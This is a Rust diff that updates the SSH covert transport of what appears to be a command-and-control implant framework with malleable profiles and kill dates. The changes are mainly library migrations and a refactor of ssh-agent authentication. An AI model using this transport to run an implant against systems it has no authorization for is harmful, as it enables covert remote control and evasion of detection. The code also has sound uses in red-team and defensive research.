@@ -1,4 +1,4 @@
-// Requires russh >= 0.46
+// Requires russh >= 0.60
 //! SSH covert transport for the agent.
 //!
 //! # Status: EXPERIMENTAL - not recommended for production use.
@@ -49,9 +49,10 @@ use anyhow::{anyhow, Result};
 use async_trait::async_trait;
 use common::config::{MalleableProfile, SshAuthConfig};
 use common::{CryptoSession, Message, Transport};
-use log::info;
+use tracing::info;
 use russh::client;
-use russh_keys::key::PublicKey;
+use russh::keys::ssh_key;
+use russh::keys::key::PrivateKeyWithHashAlg;
 use std::sync::Arc;
 use subtle::ConstantTimeEq;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
@@ -75,33 +76,33 @@ struct ClientHandler {
     allowed_host_key: Option<String>,
 }
 
-#[async_trait]
 impl client::Handler for ClientHandler {
     type Error = anyhow::Error;
 
     async fn check_server_key(
         &mut self,
-        server_public_key: &PublicKey,
+        server_public_key: &ssh_key::PublicKey,
     ) -> Result<bool, Self::Error> {
-        let fingerprint = server_public_key.fingerprint();
+        let fingerprint = server_public_key.fingerprint(ssh_key::HashAlg::Sha256);
+        let fp_string = format!("{}", fingerprint);
         match &self.allowed_host_key {
             Some(expected) => {
                 // Constant-time comparison to prevent timing side-channel
                 // attacks that could brute-force the expected fingerprint
                 // byte-by-byte.
-                if fingerprint.as_bytes().ct_eq(expected.as_bytes()).into() {
+                if fp_string.as_bytes().ct_eq(expected.as_bytes()).into() {
                     Ok(true)
                 } else {
-                    log::error!(
+                    tracing::error!(
                         "ssh-transport: host key fingerprint mismatch — rejecting connection"
                     );
                     Ok(false)
                 }
             }
             None => {
-                log::warn!(
+                tracing::warn!(
                     "ssh-transport: no host key fingerprint configured; \
-                     accepting server key {fingerprint} without verification"
+                     accepting server key {fp_string} without verification"
                 );
                 Ok(true)
             }
@@ -110,6 +111,67 @@ impl client::Handler for ClientHandler {
 }
 
 // ── Transport struct ──────────────────────────────────────────────────────────
+
+/// Helper: enumerate ssh-agent identities and attempt authentication with each.
+///
+/// Generic over the agent stream type so it works with all connection methods
+/// (Unix socket, Windows named pipe, Pageant) without needing a common
+/// dynamic dispatch wrapper.
+async fn authenticate_with_agent<S>(
+    handle: &mut client::Handle<ClientHandler>,
+    username: &str,
+    agent_client: &mut russh::keys::agent::client::AgentClient<S>,
+) -> Result<bool>
+where
+    S: russh::keys::agent::client::AgentStream + Unpin + Send + 'static,
+{
+    let identities = agent_client
+        .request_identities()
+        .await
+        .map_err(|e| anyhow!("ssh-transport: failed to enumerate ssh-agent identities: {e}"))?;
+
+    if identities.is_empty() {
+        return Err(anyhow!(
+            "ssh-transport: ssh-agent is reachable but has no identities loaded; add a key with ssh-add"
+        ));
+    }
+
+    let hash_alg = handle
+        .best_supported_rsa_hash()
+        .await
+        .map_err(|e| anyhow!("ssh-transport: failed to determine RSA hash: {e}"))?
+        .flatten();
+
+    let mut authenticated = false;
+    for identity in identities {
+        let pubkey = identity.public_key().clone().into_owned();
+        let fingerprint = format!("{}", pubkey.fingerprint(ssh_key::HashAlg::Sha256));
+
+        match handle
+            .authenticate_publickey_with(username, pubkey, hash_alg, &mut *agent_client)
+            .await
+        {
+            Ok(result) if result.success() => {
+                info!(
+                    "ssh-transport: ssh-agent authentication succeeded with identity {fingerprint}"
+                );
+                authenticated = true;
+                break;
+            }
+            Ok(_) => {
+                tracing::debug!(
+                    "ssh-transport: ssh-agent identity {fingerprint} was rejected by server"
+                );
+            }
+            Err(e) => {
+                tracing::debug!(
+                    "ssh-transport: ssh-agent identity {fingerprint} failed during authentication: {e}"
+                );
+            }
+        }
+    }
+    Ok(authenticated)
+}
 
 /// SSH-tunnelled transport.
 ///
@@ -195,106 +257,111 @@ impl SshTransport {
 
         // Authenticate according to the configured method.
         let authenticated = match auth_cfg {
-            SshAuthConfig::Password { password } => handle
-                .authenticate_password(username, password.as_str())
-                .await
-                .map_err(|e| anyhow!("ssh-transport: password auth error: {e}"))?,
+            SshAuthConfig::Password { password } => {
+                let auth_result = handle
+                    .authenticate_password(username, password.as_str())
+                    .await
+                    .map_err(|e| anyhow!("ssh-transport: password auth error: {e}"))?;
+                auth_result.success()
+            }
 
             SshAuthConfig::Key { key_path } => {
-                let key_pair = russh_keys::load_secret_key(key_path, None)
-                    .map_err(|e| anyhow!("ssh-transport: failed to load key '{key_path}': {e}"))?;
-                handle
-                    .authenticate_publickey(username, Arc::new(key_pair))
+                let key_data = std::fs::read_to_string(key_path)
+                    .map_err(|e| anyhow!("ssh-transport: failed to read key '{key_path}': {e}"))?;
+                let key_pair = russh::keys::decode_secret_key(&key_data, None)
+                    .map_err(|e| anyhow!("ssh-transport: failed to decode key '{key_path}': {e}"))?;
+                let hash_alg = handle
+                    .best_supported_rsa_hash()
                     .await
-                    .map_err(|e| anyhow!("ssh-transport: public-key auth error: {e}"))?
+                    .map_err(|e| anyhow!("ssh-transport: failed to determine RSA hash: {e}"))?
+                    .flatten();
+                let auth_result = handle
+                    .authenticate_publickey(
+                        username,
+                        PrivateKeyWithHashAlg::new(Arc::new(key_pair), hash_alg),
+                    )
+                    .await
+                    .map_err(|e| anyhow!("ssh-transport: public-key auth error: {e}"))?;
+                auth_result.success()
             }
 
             SshAuthConfig::Agent => {
-                let mut agent_client = {
-                    #[cfg(unix)]
-                    {
-                        russh_keys::agent::client::AgentClient::connect_env()
+                // Resolve the best RSA hash algorithm upfront (needed for
+                // agent-based publickey authentication in russh 0.60+).
+                #[cfg(unix)]
+                {
+                    let mut agent_client =
+                        russh::keys::agent::client::AgentClient::connect_env()
                             .await
-                            .map_err(|e| match e {
-                                russh_keys::Error::EnvVar("SSH_AUTH_SOCK") => anyhow!(
-                                    "ssh-transport: ssh-agent auth requires SSH_AUTH_SOCK to be set and a running ssh-agent; start ssh-agent and load a key with ssh-add"
-                                ),
-                                russh_keys::Error::BadAuthSock => anyhow!(
-                                    "ssh-transport: ssh-agent auth requires a reachable socket at SSH_AUTH_SOCK; start ssh-agent and ensure SSH_AUTH_SOCK points to the agent socket"
-                                ),
-                                other => anyhow!("ssh-transport: failed to connect to ssh-agent: {other}"),
-                            })?
-                            .dynamic()
-                    }
+                            .map_err(|e| {
+                                anyhow!(
+                                    "ssh-transport: failed to connect to ssh-agent \
+                                     (ensure SSH_AUTH_SOCK is set and ssh-agent is running): {e}"
+                                )
+                            })?;
+                    authenticate_with_agent(&mut handle, username, &mut agent_client).await?
+                }
 
-                    #[cfg(windows)]
-                    {
-                        if let Ok(agent_socket) = std::env::var("SSH_AUTH_SOCK") {
-                            match russh_keys::agent::client::AgentClient::connect_named_pipe(
-                                &agent_socket,
-                            )
-                            .await
-                            {
-                                Ok(client) => client.dynamic(),
-                                Err(e) => {
-                                    log::warn!(
-                                        "ssh-transport: SSH_AUTH_SOCK named pipe connection failed ({}), falling back to Pageant",
-                                        e
-                                    );
-                                    russh_keys::agent::client::AgentClient::connect_pageant()
-                                        .await
-                                        .dynamic()
-                                }
+                #[cfg(windows)]
+                {
+                    // On Windows, try the named pipe pointed to by SSH_AUTH_SOCK
+                    // first (OpenSSH for Windows agent), then fall back to Pageant.
+                    if let Ok(agent_socket) = std::env::var("SSH_AUTH_SOCK") {
+                        match russh::keys::agent::client::AgentClient::connect_named_pipe(
+                            &agent_socket,
+                        )
+                        .await
+                        {
+                            Ok(mut agent_client) => {
+                                authenticate_with_agent(
+                                    &mut handle,
+                                    username,
+                                    &mut agent_client,
+                                )
+                                .await?
                             }
-                        } else {
-                            russh_keys::agent::client::AgentClient::connect_pageant()
-                                .await
-                                .dynamic()
+                            Err(e) => {
+                                tracing::warn!(
+                                    "ssh-transport: SSH_AUTH_SOCK named pipe connection \
+                                     failed ({e}), falling back to Pageant"
+                                );
+                                let mut agent_client =
+                                    russh::keys::agent::client::AgentClient::connect_pageant()
+                                        .await
+                                        .map_err(|e2| {
+                                            anyhow!(
+                                                "ssh-transport: failed to connect to \
+                                                 Pageant: {e2}"
+                                            )
+                                        })?;
+                                authenticate_with_agent(
+                                    &mut handle,
+                                    username,
+                                    &mut agent_client,
+                                )
+                                .await?
+                            }
                         }
+                    } else {
+                        let mut agent_client =
+                            russh::keys::agent::client::AgentClient::connect_pageant()
+                                .await
+                                .map_err(|e| {
+                                    anyhow!(
+                                        "ssh-transport: failed to connect to Pageant \
+                                         (ensure Pageant or ssh-agent is running): {e}"
+                                    )
+                                })?;
+                        authenticate_with_agent(&mut handle, username, &mut agent_client).await?
                     }
-                };
+                }
 
-                let identities = agent_client.request_identities().await.map_err(|e| {
-                    anyhow!("ssh-transport: failed to enumerate ssh-agent identities: {e}")
-                })?;
-
-                if identities.is_empty() {
+                #[cfg(not(any(unix, windows)))]
+                {
                     return Err(anyhow!(
-                        "ssh-transport: ssh-agent is reachable but has no identities loaded; add a key with ssh-add"
+                        "ssh-transport: ssh-agent authentication is not supported on this platform"
                     ));
                 }
-
-                let mut authenticated_via_agent = false;
-
-                for key in identities {
-                    let fingerprint = key.fingerprint();
-                    let (next_client, auth_result) = handle
-                        .authenticate_future(username, key, agent_client)
-                        .await;
-                    agent_client = next_client;
-
-                    match auth_result {
-                        Ok(true) => {
-                            info!(
-                                "ssh-transport: ssh-agent authentication succeeded with identity {fingerprint}"
-                            );
-                            authenticated_via_agent = true;
-                            break;
-                        }
-                        Ok(false) => {
-                            log::debug!(
-                                "ssh-transport: ssh-agent identity {fingerprint} was rejected by server"
-                            );
-                        }
-                        Err(e) => {
-                            log::debug!(
-                                "ssh-transport: ssh-agent identity {fingerprint} failed during authentication: {e}"
-                            );
-                        }
-                    }
-                }
-
-                authenticated_via_agent
             }
         };
 
@@ -401,7 +468,7 @@ impl Transport for SshTransport {
             crate::config::check_kill_date(&self.profile.kill_date)?;
         }
 
-        let serialized = bincode::serialize(&msg)?;
+        let serialized = bincode::serde::encode_to_vec(&msg, bincode::config::legacy())?;
         let ciphertext = self.crypto_session.encrypt(&serialized);
 
         // 4-byte big-endian length prefix followed by ciphertext payload.
@@ -414,7 +481,7 @@ impl Transport for SshTransport {
         match self.stream.write_all(&frame).await {
             Ok(()) => Ok(()),
             Err(e) => {
-                log::info!("ssh-transport: send failed ({e:#}), attempting channel reopen");
+                tracing::info!("ssh-transport: send failed ({e:#}), attempting channel reopen");
                 self.reopen_channel().await?;
                 // Retry the write on the fresh channel.
                 self.stream
@@ -464,7 +531,7 @@ impl Transport for SshTransport {
                     self.recv_buf.drain(..4 + payload_len);
 
                     let plaintext = self.crypto_session.decrypt(&frame)?;
-                    let message: Message = bincode::deserialize(&plaintext)?;
+                    let message: Message = bincode::serde::decode_from_slice(&plaintext, bincode::config::legacy()).map(|(v, _)| v)?;
                     return Ok(message);
                 }
             }
@@ -474,7 +541,7 @@ impl Transport for SshTransport {
             match self.stream.read(&mut tmp).await {
                 Ok(0) => {
                     // Channel EOF — attempt reopen before giving up.
-                    log::info!("ssh-transport: channel EOF received, attempting reopen");
+                    tracing::info!("ssh-transport: channel EOF received, attempting reopen");
                     match self.reopen_channel().await {
                         Ok(()) => continue, // Channel reopened, keep receiving.
                         Err(e) => {
@@ -489,7 +556,7 @@ impl Transport for SshTransport {
                 }
                 Err(e) => {
                     // Read error — attempt reopen before giving up.
-                    log::info!("ssh-transport: recv read error ({e:#}), attempting channel reopen");
+                    tracing::info!("ssh-transport: recv read error ({e:#}), attempting channel reopen");
                     match self.reopen_channel().await {
                         Ok(()) => continue, // Channel reopened, keep receiving.
                         Err(reopen_err) => {
